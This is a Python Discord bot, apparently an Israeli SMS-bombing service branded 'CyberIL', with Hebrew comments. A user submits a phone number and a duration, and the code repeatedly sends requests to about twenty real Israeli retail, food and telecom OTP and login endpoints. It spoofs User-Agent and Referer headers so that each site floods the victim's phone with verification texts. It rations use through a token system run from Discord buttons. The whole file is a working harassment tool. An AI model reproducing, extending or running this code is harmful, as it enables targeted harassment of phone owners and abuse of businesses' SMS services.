import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient

# --- הגדרות מערכת (Railway Variables) ---
TOKEN = os.getenv('DISCORD_TOKEN')
MONGO_URI = os.getenv('MONGO_URI')
BLOCKED_NUMBERS = [""]

cluster = AsyncIOMotorClient(MONGO_URI)
db = cluster["cyberil"]
users_col = db["users"]
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        # הגדרת Intents מלאה למניעת שגיאות לוג
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"🔱 CyberIL OMNI-BEAST ONLINE | High Performance Mode Active")

bot = CyberBot()

# --- פונקציות עזר ---
def get_random_ua():
    version = random.randint(110, 126)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36"

async def get_user(uid):
    user = await users_col.find_one({"_id": uid})
    if not user:
        user = {"_id": uid, "tokens": 0, "last_claim": None}
        await users_col.insert_one(user)
    return user

def api_call(url, data=None, method="POST", is_json=True, params=None):
    try:
        headers = {
            "User-Agent": get_random_ua(),
            "Accept": "*/*",
            "Connection": "close",
            "Referer": "https://google.com"
        }
        if method == "GET": requests.get(url, headers=headers, params=params, timeout=4)
        elif method == "PUT": requests.put(url, json=data, headers=headers, timeout=4)
        else:
            if is_json: requests.post(url, json=data, headers=headers, timeout=4)
            else: requests.post(url, data=data, headers=headers, timeout=4)
        return True
    except: return False

# --- מנוע ההפצצה ---
async def fire_beast_round(phone):
    magento_data = {"type": "login", "telephone": phone, "bot_validation": 1}
    phone_intl = f"+972{phone[1:]}"
    
    # רשימת ה-APIs המלאה (לא מחקתי כלום!)
    targets = [
        # מנועי White-Label (עשרות אתרים בבת אחת)
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-renuar-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-aldoshoes-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://ros-rp-beta.tabit.cloud/services/loyalty/customerProfile/auth/mobile", {"mobile": phone}, "POST", True),
        ("https://www.cashontab.co.il/cgi-bin/JMForms", {"version": 2, "companyCode": "1a66", "scriptName": "create_random_connection_token", "input": [{"value": f"_type\f_params\f_mobile\f_lang\r1\fmobile={phone}&pos=999\f{phone}\f2"}]}, "POST", True),
        
        # אופנה וקניות
        ("https://www.castro.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.hoodies.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.urbanica-wh.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.crazyline.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.onot.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.timberland.co.il/customer/ajax/post/", magento_data, "POST", False),

        # אוכל ורשתות
        ("https://api.dominos.co.il/sendOtp", {"otpMethod":"text","customerId": phone,"language":"he"}, "POST", True),
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, "POST", False),
        ("https://www.prego.co.il/_a/aff_otp_auth", {"phone": phone}, "POST", False),
        ("https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, "POST", False),
        
        # תקשורת ושירותים
        ("https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "OtpOrigin": "main OTP"}, "PUT", True),
        ("https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}, "POST", True),
        ("https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}, "POST", True),
        (f"https://www.ivory.co.il/user/login/sendCodeSms/user{random.randint(100,999)}@gmail.com/{phone}", None, "GET", True),
        ("https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser", None, "GET", True, {"culture":"he-IL", "cellPhone": phone})
    ]

    tasks = [asyncio.to_thread(api_call, *t) for t in targets]
    await asyncio.gather(*tasks)

async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_sent = 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **הפצצת OMNI הופעלה על `{phone}`!**", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        user = await get_user(uid)
        if user["tokens"] <= 0:
            await interaction.followup.send("⚠️ נגמרה היתרה!", ephemeral=True)
            break
        
        await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})
        
        for _ in range(4): # 4 גלים בדקה
            if not active_attacks.get(uid): break
            await fire_beast_round(phone)
            total_sent += 20 
            await asyncio.sleep(15)

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **הושלם!** יעד: `{phone}` | נשלחו כ-`{total_sent}` הודעות.", ephemeral=True)

# --- ממשק כפתורים ---
class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        if user["tokens"] < 1: return await interaction.response.send_message("❌ אין לך דקות!", ephemeral=True)
        
        class LaunchModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (דקות)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="יתרה", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        await interaction.response.send_message(f"💰 יתרה: **{user['tokens']}** דקות.", ephemeral=True)

    @discord.ui.button(label="מתנה יומית", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        now = datetime.now()
        if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
            await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
            await interaction.response.send_message("✅ קיבלת 5 דקות!", ephemeral=True)
        else: await interaction.response.send_message("⏳ כבר לקחת היום.", ephemeral=True)

    @discord.ui.button(label="עצור הכל", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)

@bot.tree.command(name="setup", description="הפעלת לוח הבקרה")
async def setup(interaction: discord.Interaction):
    user = await get_user(interaction.user.id)
    embed = discord.Embed(
        title="⚡ CyberIL SMS Control Panel",
        description="ברוך הבא למערכת ההפצצה. בחר פעולה מהכפתורים למטה.",
        color=0x2ecc71
    )
    embed.add_field(name="משתמש 👤", value=interaction.user.mention, inline=True)
    embed.add_field(name="יתרה 💰", value=f"{user['tokens']} דקות", inline=True)
    embed.set_footer(text="CyberIL Studio - High Performance Spamer")
    
    # תיקון שגיאת Interaction Responded
    try:
        await interaction.response.send_message(embed=embed, view=CyberView())
    except:
        await interaction.followup.send(embed=embed, view=CyberView())

@bot.tree.command(name="give", description="ניהול דקות")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    if interaction.user.id != 1148633722057031761: 
        return await interaction.response.send_message("❌", ephemeral=True)
    await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)

bot.run(TOKEN)
